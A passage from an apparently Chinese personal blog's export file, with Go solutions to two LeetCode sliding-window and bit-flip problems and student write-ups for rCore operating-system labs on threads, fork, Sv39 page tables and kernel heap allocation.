<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], K &#x3D; 3</span><br><span class="line">输出：10</span><br><span class="line">解释：</span><br><span class="line">[0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1]</span><br><span class="line">粗体数字从 0 翻转到 1，最长的子数组长度为 10。</span><br></pre></td></tr></table></figure>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">longestOnes</span><span class="params">(A []<span class="keyword">int</span>, K <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    size := <span class="built_in">len</span>(A)</span><br><span class="line">    left, right := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    res, sum := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> right &lt; size &#123;</span><br><span class="line">        sum += A[right] ^ <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> sum &gt; K &#123;</span><br><span class="line">            sum -= (A[left] ^ <span class="number">1</span>)</span><br><span class="line">            left += <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = max(res, right-left+<span class="number">1</span>)</span><br><span class="line">        right += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a,b <span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> a &gt; b&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode995-K连续位的最小翻转次数</title>
    <url>/2021/02/19/LeetCode995-K%E8%BF%9E%E7%BB%AD%E4%BD%8D%E7%9A%84%E6%9C%80%E5%B0%8F%E7%BF%BB%E8%BD%AC%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description</h2>
<p>在仅包含 0 和 1 的数组 A 中，一次 K 位翻转包括选择一个长度为 K 的（连续）子数组，同时将子数组中的每个 0 更改为 1，而每个 1 更改为 0。</p>
<p>返回所需的 K 位翻转的最小次数，以便数组没有值为 0 的元素。如果不可能，返回 -1。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples</h2>
<p>示例 1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [0,1,0], K &#x3D; 1</span><br><span class="line">输出：2</span><br><span class="line">解释：先翻转 A[0]，然后翻转 A[2]。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [1,1,0], K &#x3D; 2</span><br><span class="line">输出：-1</span><br><span class="line">解释：无论我们怎样翻转大小为 2 的子数组，我们都不能使数组变为 [1,1,1]。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [0,0,0,1,0,1,1,0], K &#x3D; 3</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">翻转 A[0],A[1],A[2]: A变成 [1,1,1,1,0,1,1,0]</span><br><span class="line">翻转 A[4],A[5],A[6]: A变成 [1,1,1,1,1,0,0,0]</span><br><span class="line">翻转 A[5],A[6],A[7]: A变成 [1,1,1,1,1,1,1,1]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">minKBitFlips</span><span class="params">(A []<span class="keyword">int</span>, K <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    size := <span class="built_in">len</span>(A);</span><br><span class="line">    queue := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>);</span><br><span class="line">    res := <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> index, value := <span class="keyword">range</span> A &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(queue) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> queue[<span class="number">0</span>] + K <span class="number">-1</span> &lt; index &#123;</span><br><span class="line">            queue = queue[<span class="number">1</span>:];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(queue)%<span class="number">2</span> != value&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        queue = <span class="built_in">append</span>(queue, index);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index + K  &gt; size&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>rCore Lab-6</title>
    <url>/2021/02/19/rCore-Lab-6/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>rCore</tag>
      </tags>
  </entry>
  <entry>
    <title>rCore Lab-5</title>
    <url>/2021/02/19/rCore-Lab-5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>rCore</tag>
      </tags>
  </entry>
  <entry>
    <title>rCore Lab-4</title>
    <url>/2021/02/14/rCore-Lab-4/</url>
    <content><![CDATA[<h2 id="实验四上线程"><a class="markdownIt-Anchor" href="#实验四上线程"></a> 实验四（上）：线程</h2>
<h3 id="实验题"><a class="markdownIt-Anchor" href="#实验题"></a> 实验题</h3>
<ol>
<li>
<p>原理：线程切换之中，页表是何时切换的？页表的切换会不会影响程序 / 操作系统的运行？为什么？</p>
<p>页表是在 <code>Process::prepare_next_thread()</code> 中调用 <code>Thread::prepare()</code>，其中换入了新线程的页表。</p>
<p>它不会影响执行，因为在中断期间是操作系统正在执行，而操作系统所用到的内核线性映射是存在于每个页表中的。</p>
</li>
<li>
<p>设计：如果不使用 <code>sscratch</code> 提供内核栈，而是像原来一样，遇到中断就直接将上下文压栈，请举出（思路即可，无需代码）：</p>
<ul>
<li>
<p>一种情况不会出现问题</p>
</li>
<li>
<p>一种情况导致异常无法处理（指无法进入 <code>handle_interrupt</code>）</p>
</li>
<li>
<p>一种情况导致产生嵌套异常（指第二个异常能够进行到调用 <code>handle_interrupt</code>，不考虑后续执行情况）</p>
</li>
<li>
<p>一种情况导致一个用户进程（先不考虑是怎么来的）可以将自己变为内核进程，或以内核态执行自己的代码</p>
</li>
<li>
<p>只运行一个非常善意的线程，比如 <code>loop &#123;&#125;</code></p>
</li>
<li>
<p>线程把自己的 <code>sp</code> 搞丢了，比如 <code>mv sp, x0</code>。此时无法保存寄存器，也没有能够支持操作系统正常运行的栈</p>
</li>
<li>
<p>运行两个线程。在两个线程切换的时候，会需要切换页表。但是此时操作系统运行在前一个线程的栈上，一旦切换，再访问栈就会导致缺页，因为每个线程的栈只在自己的页表中</p>
</li>
<li>
<p>用户进程巧妙地设计 <code>sp</code>，使得它恰好落在内核的某些变量附近，于是在保存寄存器时就修改了变量的值。这相当于任意修改操作系统的控制信息</p>
</li>
</ul>
</li>
<li>
<p>实验：当键盘按下 Ctrl + C 时，操作系统应该能够捕捉到中断。实现操作系统捕获该信号并结束当前运行的线程（你可能需要阅读一点在实验指导中没有提到的代码）</p>
</li>
</ol>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">supervisor_external</span></span>(context: &amp;<span class="keyword">mut</span> Context) -&gt; *<span class="keyword">mut</span> Context &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> c = console_getchar();</span><br><span class="line">    <span class="keyword">if</span> c &lt;= <span class="number">255</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> c == <span class="number">3</span> &#123;</span><br><span class="line">            PROCESSOR.lock().kill_current_thread();</span><br><span class="line">            PROCESSOR.lock().prepare_next_thread();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;\r&#x27;</span> <span class="keyword">as</span> <span class="built_in">usize</span> &#123;</span><br><span class="line">            c = <span class="string">&#x27;\n&#x27;</span> <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        STDIN.push(c <span class="keyword">as</span> <span class="built_in">u8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    context</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>实验：实现进程的 <code>fork()</code>。目前的内核线程不能进行系统调用，所以我们先简化地实现为“按 F 进行 fork”。fork 后应当为目前的进程复制一份几乎一样的拷贝。</li>
</ol>
<p><strong><a href="http://handler.rs">handler.rs</a></strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">supervisor_external</span></span>(context: &amp;<span class="keyword">mut</span> Context) -&gt; *<span class="keyword">mut</span> Context &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> c = console_getchar();</span><br><span class="line">    <span class="keyword">if</span> c &lt;= <span class="number">255</span> &#123;</span><br><span class="line">        <span class="comment">// interrupt current thread</span></span><br><span class="line">        <span class="keyword">if</span> c == <span class="number">3</span> &#123;</span><br><span class="line">            PROCESSOR.lock().kill_current_thread();</span><br><span class="line">            PROCESSOR.lock().prepare_next_thread();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// fork</span></span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;F&#x27;</span> <span class="keyword">as</span> <span class="built_in">usize</span>&#123;</span><br><span class="line">            PROCESSOR.lock().fork_current_thread(context);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;\r&#x27;</span> <span class="keyword">as</span> <span class="built_in">usize</span> &#123;</span><br><span class="line">            c = <span class="string">&#x27;\n&#x27;</span> <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        STDIN.push(c <span class="keyword">as</span> <span class="built_in">u8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    context</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong><a href="http://processor.rs">processor.rs</a></strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">fork_current_thread</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, context: &amp;Context)&#123;</span><br><span class="line">        <span class="keyword">let</span> thread = <span class="keyword">self</span>.current_thread().fork(*context).unwrap();</span><br><span class="line">        <span class="keyword">self</span>.add_thread(thread);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong><a href="http://thread.rs">thread.rs</a></strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fork thread and return</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">fork</span></span>(&amp;<span class="keyword">self</span>, current_context: Context) -&gt; MemoryResult&lt;Arc&lt;Thread&gt;&gt; &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;fork!&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> stack = <span class="keyword">self</span></span><br><span class="line">        .process</span><br><span class="line">        .alloc_page_range(STACK_SIZE, Flags::READABLE | Flags::WRITABLE)?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..STACK_SIZE&#123;</span><br><span class="line">            *VirtualAddress(stack.start.<span class="number">0</span> + i).deref::&lt;<span class="built_in">u8</span>&gt;() = *VirtualAddress(<span class="keyword">self</span>.stack.start.<span class="number">0</span> + i).deref::&lt;<span class="built_in">u8</span>&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> context = current_context.clone();</span><br><span class="line">        context.set_sp(<span class="built_in">usize</span>::from(stack.start) - <span class="built_in">usize</span>::from(<span class="keyword">self</span>.stack.start) + current_context.sp());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> process = <span class="keyword">self</span>.process.clone();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> thread = Arc::new(Thread&#123;</span><br><span class="line">            id : <span class="keyword">unsafe</span>&#123;</span><br><span class="line">                THREAD_COUNTER += <span class="number">1</span>;</span><br><span class="line">                THREAD_COUNTER</span><br><span class="line">            &#125;,</span><br><span class="line">            stack,</span><br><span class="line">            process,</span><br><span class="line">            inner : Mutex::new(ThreadInner&#123;</span><br><span class="line">                context: <span class="literal">Some</span>(context),</span><br><span class="line">                sleeping: <span class="literal">false</span>,</span><br><span class="line">                dead: <span class="literal">false</span></span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="literal">Ok</span>(thread)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>rCore</tag>
      </tags>
  </entry>
  <entry>
    <title>rCore Lab-3</title>
    <url>/2021/02/10/rCore-Lab-3/</url>
    <content><![CDATA[<p><img src="/2021/02/10/rCore-Lab-3/rcore_memory_layout.png" alt></p>
<h2 id="实验三-虚实地址转换"><a class="markdownIt-Anchor" href="#实验三-虚实地址转换"></a> 实验三 虚实地址转换</h2>
<h3 id="实验题"><a class="markdownIt-Anchor" href="#实验题"></a> 实验题</h3>
<p>1.原理： 原理：在 <code>os/src/entry.asm</code> 中，<code>boot_page_table</code> 的意义是什么？当跳转执行 <code>rust_main</code> 时，不考虑缓存，硬件通过哪些地址找到了 <code>rust_main</code> 的第一条指令？</p>
<p>更改后的<code>entry.asm</code>如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 操作系统启动时所需的指令以及字段</span><br><span class="line">#</span><br><span class="line"># 我们在 linker.ld 中将程序入口设置为了 _start，因此在这里我们将填充这个标签</span><br><span class="line"># 它将会执行一些必要操作，然后跳转至我们用 rust 编写的入口函数</span><br><span class="line">#</span><br><span class="line"># 关于 RISC-V 下的汇编语言，可以参考 https:&#x2F;&#x2F;github.com&#x2F;riscv&#x2F;riscv-asm-manual&#x2F;blob&#x2F;master&#x2F;riscv-asm.md</span><br><span class="line"># %hi 表示取 [12,32) 位，%lo 表示取 [0,12) 位</span><br><span class="line"></span><br><span class="line">    .section .text.entry</span><br><span class="line">    .globl _start</span><br><span class="line"># 目前 _start 的功能：将预留的栈空间写入 $sp，然后跳转至 rust_main</span><br><span class="line">_start:</span><br><span class="line">    # 通过线性映射关系计算 boot_page_table 的物理页号</span><br><span class="line">    lui t0, %hi(boot_page_table)</span><br><span class="line">    li t1, 0xffffffff00000000</span><br><span class="line">    sub t0, t0, t1</span><br><span class="line">    srli t0, t0, 12</span><br><span class="line">    # 8 &lt;&lt; 60 是 satp 中使用 Sv39 模式的记号</span><br><span class="line">    li t1, (8 &lt;&lt; 60)</span><br><span class="line">    or t0, t0, t1</span><br><span class="line">    # 写入 satp 并更新 TLB</span><br><span class="line">    csrw satp, t0</span><br><span class="line">    sfence.vma</span><br><span class="line"></span><br><span class="line">    # 加载栈的虚拟地址</span><br><span class="line">    lui sp, %hi(boot_stack_top)</span><br><span class="line">    addi sp, sp, %lo(boot_stack_top)</span><br><span class="line">    # 跳转至 rust_main</span><br><span class="line">    # 这里同时伴随 hart 和 dtb_pa 两个指针的传入（是 OpenSBI 帮我们完成的）</span><br><span class="line">    lui t0, %hi(rust_main)</span><br><span class="line">    addi t0, t0, %lo(rust_main)</span><br><span class="line">    jr t0</span><br><span class="line"></span><br><span class="line">    # 回忆：bss 段是 ELF 文件中只记录长度，而全部初始化为 0 的一段内存空间</span><br><span class="line">    # 这里声明字段 .bss.stack 作为操作系统启动时的栈</span><br><span class="line">    .section .bss.stack</span><br><span class="line">    .global boot_stack</span><br><span class="line">boot_stack:</span><br><span class="line">    # 16K 启动栈大小</span><br><span class="line">    .space 4096 * 16</span><br><span class="line">    .global boot_stack_top</span><br><span class="line">boot_stack_top:</span><br><span class="line">    # 栈结尾</span><br><span class="line"></span><br><span class="line">    # 初始内核映射所用的页表</span><br><span class="line">    .section .data</span><br><span class="line">    .align 12</span><br><span class="line">    .global boot_page_table</span><br><span class="line">boot_page_table:</span><br><span class="line">    # .8byte表示长度为8个字节的整数</span><br><span class="line">    .8byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">    # 第 2 项：0x8000_0000 -&gt; 0x8000_0000，0xcf 表示 VRWXAD 均为 1</span><br><span class="line">    .8byte (0x80000 &lt;&lt; 10) | 0xcf</span><br><span class="line">    .zero 505 * 8</span><br><span class="line">    # 第 508 项（外设用）：0xffff_ffff_0000_0000 -&gt; 0x0000_0000，0xcf 表示 VRWXAD 均为 1</span><br><span class="line">    .8byte (0x00000 &lt;&lt; 10) | 0xcf</span><br><span class="line">    .8byte 0</span><br><span class="line">    # 第 510 项：0xffff_ffff_8000_0000 -&gt; 0x8000_0000，0xcf 表示 VRWXAD 均为 1</span><br><span class="line">    .8byte (0x80000 &lt;&lt; 10) | 0xcf</span><br><span class="line">    .8byte 0</span><br></pre></td></tr></table></figure>
<p>我们一步步讲解<code>entry.asm</code>是如何进行从物理地址到虚拟地址的转变的。首先声明代码段位置并且实现在<code>linker.ld</code>中声明的<code>__start</code>函数，随后我们做的就是把<code>boot_page_table</code>（即页表基址）的虚拟地址转化成物理地址写入<code>satp</code>寄存器中，我们来看是如何把<code>boot_page_table</code>的物理页号写入的：</p>
<p>由于在<code>rCore</code>中，我们选择了RISC -V本身硬件支持Sv39模式作为页表的实现。</p>
<p>在 Sv39 模式中，定义物理地址有 56 位，而虚拟地址有 64 位。虽然虚拟地址有 64 位，只有低 39 位有效。不过这不是说高 25 位可以随意取值，规定 63-39 位的值必须等于第 38 位的值，否则会认为该虚拟地址不合法，在访问时会产生异常。</p>
<p>Sv39 模式同样是基于页的，在物理内存那一节曾经提到<strong>物理页（Frame）<strong>与</strong>物理页号（PPN，Physical Page Number）</strong>。在这里物理页号为 44 位，每个物理页大小为 4KB。同理，我们对于虚拟内存定义<strong>虚拟页（Page）<strong>以及</strong>虚拟页号（VPN, Virtual Page Number)</strong> 。在这里虚拟页号为 27 位，每个虚拟页大小也为 4KB。物理地址和虚拟地址的最后 12 位都表示页内偏移，即表示该地址在所在物理页（虚拟页）上的什么位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lui t0, %hi(boot_page_table)</span><br><span class="line">   li t1, 0xffffffff00000000</span><br><span class="line">   sub t0, t0, t1</span><br><span class="line">   srli t0, t0, 12</span><br><span class="line">   # 8 &lt;&lt; 60 是 satp 中使用 Sv39 模式的记号</span><br><span class="line">   li t1, (8 &lt;&lt; 60)</span><br><span class="line">   or t0, t0, t1</span><br><span class="line">   # 写入 satp 并更新 TLB</span><br><span class="line">   csrw satp, t0</span><br><span class="line">   sfence.vma</span><br></pre></td></tr></table></figure>
<p>首先，我们取<code>boot_page_table</code>地址的12位到32位，此为物理地址的页号，然后将物理地址页号与<code>0xffffffff00000000</code>进行相减存到<code>t0</code>寄存器中，然后将<code>t0</code>寄存器右移12位，然后我们将<code>(8 &lt;&lt; 60)</code>作为Sv39模式的记号存入到<code>t1</code>寄存器中，然后将<code>t0</code>和<code>t1</code>寄存器进行或运算存入到<code>satp</code>寄存器中，并且更新快表。这样我们就可以通过<code>satp</code>寄存器的值来找到页表基址。</p>
<p>随后我们计算栈起始地址并将其写入<code>sp</code>寄存器中，并且计算出<code>rust_main</code>函数的虚拟地址并写入临时寄存器中。此时我们已经有了<code>rust_main</code>的虚拟地址了，我们可以从虚拟地址（即高地址）首先取其高九位（即VPN3）判断其寻找VPN2的地址（此时应为510），然后再进行不断的映射最后经过<code>satp</code>寄存器找到<code>rust_main</code>的物理地址进行运行。</p>
<ol start="2">
<li>分析：为什么 <code>Mapping</code> 中的 <code>page_tables</code> 和 <code>mapped_pairs</code> 都保存了一些 <code>FrameTracker</code>？二者有何不同？</li>
</ol>
<p><code>pagr_tables</code>存放的是所有页表所使用的页面，而<code>mapped_pairs</code>则存放着进程所需要的页面。</p>
<ol start="3">
<li>分析：假设某进程需要虚拟地址 A 到物理地址 B 的映射，这需要操作系统来完成。那么操作系统在建立映射时有没有访问 B？如果有，它是怎么在还没有映射的情况下访问 B 的呢？</li>
</ol>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// 加入一段映射，可能会相应地分配物理页面</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// 未被分配物理页面的虚拟页号暂时不会写入页表当中，它们会在发生 PageFault 后再建立页表项。</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">map</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, segment: &amp;Segment, init_data: <span class="built_in">Option</span>&lt;&amp;[<span class="built_in">u8</span>]&gt;) -&gt; MemoryResult&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> segment.map_type &#123;</span><br><span class="line">        <span class="comment">// 线性映射，直接对虚拟地址进行转换</span></span><br><span class="line">        MapType::Linear =&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> vpn <span class="keyword">in</span> segment.page_range().iter() &#123;</span><br><span class="line">                <span class="keyword">self</span>.map_one(vpn, <span class="literal">Some</span>(vpn.into()), segment.flags)?;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 拷贝数据</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(data) = init_data &#123;</span><br><span class="line">                <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                    (&amp;<span class="keyword">mut</span> *slice_from_raw_parts_mut(segment.range.start.deref(), data.len()))</span><br><span class="line">                        .copy_from_slice(data);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 需要分配帧进行映射</span></span><br><span class="line">        MapType::Framed =&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> vpn <span class="keyword">in</span> segment.page_range().iter() &#123;</span><br><span class="line">                <span class="comment">// 页面的数据，默认为全零</span></span><br><span class="line">                <span class="keyword">let</span> <span class="keyword">mut</span> page_data = [<span class="number">0u8</span>; PAGE_SIZE];</span><br><span class="line">                <span class="comment">// 如果提供了数据，则使用这些数据来填充 page_data</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(init_data) = init_data &#123;</span><br><span class="line">                    <span class="keyword">if</span> !init_data.is_empty() &#123;</span><br><span class="line">                        <span class="comment">// 这里必须进行一些调整，因为传入的数据可能并非按照整页对齐</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 拷贝时必须考虑区间与整页不对齐的情况</span></span><br><span class="line">                        <span class="comment">//    start（仅第一页时非零）</span></span><br><span class="line">                        <span class="comment">//      |        stop（仅最后一页时非零）</span></span><br><span class="line">                        <span class="comment">// 0    |---data---|          4096</span></span><br><span class="line">                        <span class="comment">// |------------page------------|</span></span><br><span class="line">                        <span class="keyword">let</span> page_address = VirtualAddress::from(vpn);</span><br><span class="line">                        <span class="keyword">let</span> start = <span class="keyword">if</span> segment.range.start &gt; page_address &#123;</span><br><span class="line">                            segment.range.start - page_address</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="number">0</span></span><br><span class="line">                        &#125;;</span><br><span class="line">                        <span class="keyword">let</span> stop = min(PAGE_SIZE, segment.range.end - page_address);</span><br><span class="line">                        <span class="comment">// 计算来源和目标区间并进行拷贝</span></span><br><span class="line">                        <span class="keyword">let</span> dst_slice = &amp;<span class="keyword">mut</span> page_data[start..stop];</span><br><span class="line">                        <span class="keyword">let</span> src_slice = &amp;init_data[(page_address + start - segment.range.start)</span><br><span class="line">                            ..(page_address + stop - segment.range.start)];</span><br><span class="line">                        dst_slice.copy_from_slice(src_slice);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 建立映射</span></span><br><span class="line">                <span class="keyword">let</span> <span class="keyword">mut</span> frame = FRAME_ALLOCATOR.lock().alloc()?;</span><br><span class="line">                <span class="comment">// 更新页表</span></span><br><span class="line">                <span class="keyword">self</span>.map_one(vpn, <span class="literal">Some</span>(frame.page_number()), segment.flags)?;</span><br><span class="line">                <span class="comment">// 写入数据</span></span><br><span class="line">                (*frame).copy_from_slice(&amp;page_data);</span><br><span class="line">                <span class="comment">// 保存</span></span><br><span class="line">                <span class="keyword">self</span>.mapped_pairs.push_back((vpn, frame));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上是虚拟地址映射到物理地址的代码。</p>
<p>操作系统在建立映射时不一定访问B，但可能在访问B的同时向页面加载一些数据。尽管此时映射并不存在，但依然可以通过线性偏移量访问到B。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>rCore</tag>
      </tags>
  </entry>
  <entry>
    <title>rCore Lab-2</title>
    <url>/2021/02/08/rCore-Lab-2/</url>
    <content><![CDATA[<h2 id="实验二内存分配"><a class="markdownIt-Anchor" href="#实验二内存分配"></a> 实验二：内存分配</h2>
<h3 id="实验题"><a class="markdownIt-Anchor" href="#实验题"></a> 实验题</h3>
<p>1.原理：<code>.bss</code>字段是什么含义？为什么我们要将动态分配的内存（堆）空间放在 .bss 字段？</p>
<p><code>.bss</code>段：未初始化的全局和静态变量，以及所有被初始化为0的全局或静态变量，在目标文件中这个这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分已初始化和未初始化变量是为了空间效率：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。运行时，在内存中分配这些变量，初始化值为0。</p>
<p><code>.bss</code>段放堆空间，实际并不是必须的——我们完全可以随意指定一段可以访问的内存空间。不过，在代码中用全局变量来表示堆并将其放在<code>.bss</code>段，是一个很简单的实现：这样堆空间就包含在内核的二进制数据之中了，而自<code>KERNEL_END_ADDRESS</code>以后的空间就可以给进程使用。</p>
<p>2.分析：我们在动态内存分配中实现了一个堆，它允许我们在内核代码中使用动态分配的内存，例如 <code>Vec</code>、 <code>Box</code> 等。那么，如果我们在实现这个堆的过程中使用 <code>Vec</code> 而不是 <code>[u8]</code>，会出现什么结果？</p>
<ul>
<li>无法编译？</li>
<li>运行时错误？</li>
<li>正常运行？</li>
</ul>
<p>会发生死锁。使用<code>Vec</code>会向堆中申请内存，而<code>Allocator</code>也需要向堆内申请内存（个人感觉<code>Vec</code>的实现需要<code>Allocator</code>，而只有实现了<code>Allocator</code>才能实现堆，这样就会死循环了）。</p>
<p>3.实验：</p>
<p>I. 回答：<code>algorithm/src/allocator</code> 下有一个 <code>Allocator</code> trait，我们之前用它实现了物理页面分配。这个算法的时间和空间复杂度是什么？</p>
<p><code>allocator</code>模块中的<code>trait</code>定义如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// 分配器：固定容量，每次分配 / 回收一个元素</span></span><br><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">trait</span> <span class="title">Allocator</span></span> &#123;</span><br><span class="line">    <span class="comment">/// 给定容量，创建分配器</span></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(capacity: <span class="built_in">usize</span>) -&gt; <span class="keyword">Self</span>;</span><br><span class="line">    <span class="comment">/// 分配一个元素，无法分配则返回 `None`</span></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">alloc</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) -&gt; <span class="built_in">Option</span>&lt;<span class="built_in">usize</span>&gt;;</span><br><span class="line">    <span class="comment">/// 回收一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">dealloc</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, index: <span class="built_in">usize</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
